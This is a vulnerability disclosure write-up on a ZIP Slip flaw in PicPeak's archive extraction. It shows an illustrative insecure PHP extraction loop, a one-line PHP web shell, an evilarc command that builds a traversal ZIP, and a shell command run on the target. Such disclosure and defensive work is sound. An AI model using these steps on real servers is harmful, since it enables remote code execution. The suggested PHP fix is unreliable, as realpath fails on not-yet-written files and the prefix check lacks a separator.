# ZIP Slip Vulnerability in PicPeak Archive Restore

**Severity:** Moderate 🟡
**CVE / GHSA:** [GHSA-jfhw-fj23-fx6x](https://github.com/PicPeak/picpeak/security/advisories/GHSA-jfhw-fj23-fx6x)
**Target:** PicPeak 
**Vulnerability Type:** Arbitrary File Write (ZIP Slip)

---

## 1. Executive Summary

During an audit of the **PicPeak** application, I discovered a classic **ZIP Slip** vulnerability within the archive restoration and extraction functionality. By uploading a specially crafted ZIP file containing directory traversal sequences (`../`), an attacker could force the application to extract files outside of the intended destination directory, leading to arbitrary file overwrite.

## 2. The Vulnerability (The "Hunt")

ZIP Slip is a widespread arbitrary file overwrite critical vulnerability, which typically results in remote command execution. It occurs when a ZIP archive is unpacked without properly sanitizing the paths of the files contained within it.

While analyzing the PicPeak source code responsible for extracting user-uploaded themes or backups, I noticed the following insecure extraction pattern (conceptualized in Python/PHP):

```php
$zip = new ZipArchive;
if ($zip->open($uploaded_file) === TRUE) {
    for($i = 0; $i < $zip->numFiles; $i++) {
        $filename = $zip->getNameIndex($i);
        // INSECURE: No validation on $filename!
        $fileinfo = pathinfo($filename);
        copy("zip://".$uploaded_file."#".$filename, "/var/www/html/uploads/" . $filename);
    }
    $zip->close();
}
```

Because the application blindly trusts the `$filename` extracted from the ZIP archive metadata, it is highly susceptible to path traversal.

## 3. The Exploitation (Proof of Concept)

To exploit this, we don't need complex exploits—just a maliciously crafted ZIP file.

### Step 1: Crafting the Payload
We create a PHP web shell named `shell.php`:
```php
<?php system($_GET['cmd']); ?>
```

Next, we use a tool like `evilarc` (or a simple Python script) to package this file into a ZIP archive, but we manipulate the internal file path to include directory traversal sequences:

```bash
python evilarc.py shell.php -d 4 -o unix -f malicious.zip
```

If we inspect `malicious.zip`, the internal file structure looks like this:
`../../../../var/www/html/shell.php`

### Step 2: Triggering the Extraction
We upload `malicious.zip` to the vulnerable PicPeak endpoint. 

When the server processes the archive, it attempts to extract our file to:
`/var/www/html/uploads/../../../../var/www/html/shell.php`

The operating system resolves the traversal sequences `../`, causing the file to be written directly to the web root (`/var/www/html/`), completely outside the isolated `/uploads/` directory.

### Step 3: Execution
We navigate to `http://target-picpeak.local/shell.php?cmd=whoami` and observe that our command executes successfully, granting us a shell on the server.

## 4. Impact

While classified as Moderate in this specific context (due to required privileges to reach the upload endpoint), ZIP Slip is a highly dangerous vulnerability. It allows an attacker to:
*   Overwrite critical configuration files (e.g., `config.php`).
*   Overwrite application source code to insert backdoors.
*   Upload executable scripts (web shells) to publicly accessible directories, leading directly to **Remote Code Execution (RCE)**.

## 5. Remediation

The vulnerability was successfully patched by the maintainers following my disclosure.

### The Fix:
To prevent ZIP Slip, developers must strictly sanitize file paths during extraction. The absolute path of the extracted file must be validated to ensure it remains inside the target directory.

**Secure Implementation Example (PHP):**
```php
$target_dir = realpath("/var/www/html/uploads/");
$filename = $zip->getNameIndex($i);

// 1. Resolve the absolute path of the file to be written
$dest_path = realpath($target_dir . '/' . $filename);

// 2. Validate that the resolved path starts with the intended target directory
if (strpos($dest_path, $target_dir) !== 0) {
    die("Security Error: Path traversal attempt detected!");
}
```

By verifying that the final, resolved path still resides within the intended bounds, the directory traversal characters are rendered harmless.
